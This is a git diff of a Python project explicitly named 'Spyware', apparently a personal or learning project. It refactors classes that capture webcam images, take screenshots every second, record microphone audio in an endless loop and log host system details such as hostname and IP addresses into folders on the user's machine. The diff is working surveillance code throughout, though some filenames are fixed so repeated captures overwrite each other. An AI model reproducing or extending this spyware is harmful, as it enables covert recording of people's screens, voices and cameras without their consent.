@@ -1,4 +1,6 @@
 # Libraries
+import datetime
+
 import cv2
 from PIL import ImageGrab
 import sounddevice as sd
@@ -8,8 +10,23 @@ import time
 import socket
 from requests import get
 import platform
+from datetime import date, datetime
 
-class WEBCAMERA:
+# Base class for widely used variables
+class BaseClass:
+    def __init__(self):
+        # Date and time
+        self.currentDate = date.today()
+        self.currentTime = datetime.now()
+
+        self.folder_path_screenshots = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Screenshots"
+        self.folder_path_soundfiles = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Soundfiles"
+        self.folder_path_sys_info = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Systeminformation"
+
+class WEBCAMERA(BaseClass):
+    def __init__(self):
+        super().__init__() # Call the base class __init__ method
+
     def webcamera(self):
         cap = VideoCapture(0)
         frame, image = cap.read()
@@ -24,14 +41,17 @@ class WEBCAMERA:
         cap.release()
         cv2.destroyAllWindows()
 
-class SCREENSHOTS:
+class SCREENSHOTS(BaseClass):
     def __init__(self):
+        super().__init__() # Call the base class __init__ method
+
         # Constants for variables
         self.counter = 0
         self.sleepAmount = 1
 
-        # Folder path
-        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Screenshots"
+        # Folder path and filename
+        self.folder_path = self.folder_path_screenshots
+        self.output_file_name = f"Screenshot{self.counter}.png"
 
     def screenshots(self):
         while True:
@@ -42,39 +62,44 @@ class SCREENSHOTS:
                 os.makedirs(self.folder_path)
 
             # Save captured audio to the file path
-            file_path = os.path.join(self.folder_path, f'Screenshot{self.counter}')
+            file_path = os.path.join(self.folder_path, self.output_file_name)
             image.save(file_path)
 
             time.sleep(1)
 
-class MICROPHONE:
+class MICROPHONE(BaseClass):
     def __init__(self):
+        super().__init__() # Call the base class __init__ method
+
         # Constants for audio settings
         self.sample_rate = 44100 # Normal wave length for normal sound quality
         self.duration = 300 #Duration in seconds
 
         # Folder path and filename
-        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Soundfiles"
-        self.output_file_name = "Soundfile.wav"
+        self.folder_path = self.folder_path_soundfiles
+        self.output_file_name = f"Soundfile.wav"
 
     def microphone(self):
-        audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate = self.sample_rate, channels = 2)
+        while True:
+            audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate = self.sample_rate, channels = 2)
 
-        if not os.path.exists(self.folder_path):
-            os.makedirs(self.folder_path)
+            if not os.path.exists(self.folder_path):
+                os.makedirs(self.folder_path)
 
-        sd.wait()
+            sd.wait()
 
-        print("Finished capturing audio.\n")
+            print("Finished capturing audio.\n")
 
-        # Save captured audio to the file path
-        file_path = os.path.join(self.folder_path, self.output_file_name)
-        wf.write(file_path, self.sample_rate, audio_data)
+            # Save captured audio to the file path
+            file_path = os.path.join(self.folder_path, self.output_file_name)
+            wf.write(file_path, self.sample_rate, audio_data)
 
-class SYS_INFO:
+class SYS_INFO(BaseClass):
     def __init__(self):
+        super().__init__() # Call the base class __init__ method
+
         # Folder path and filename
-        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Systeminformation"
+        self.folder_path = self.folder_path_sys_info
         self.output_file_name = "systeminfo.txt"
 
         # Public IP website link
@@ -95,7 +120,9 @@ class SYS_INFO:
             f.write(f"System Info: {platform.system()}\n")
             f.write(f"Machine Info: {platform.machine()}\n")
             f.write(f"Hostname: {hostname}\n")
-            f.write(f"Private IP Address: {IPAddr}\n")
+            f.write(f"Private IP Address: {IPAddr}\n\n\n")
+
+            f.write(f"Current date: {self.currentDate} || Current time: {self.currentTime}")
 
     def os_version(self):
         platform_switch = {
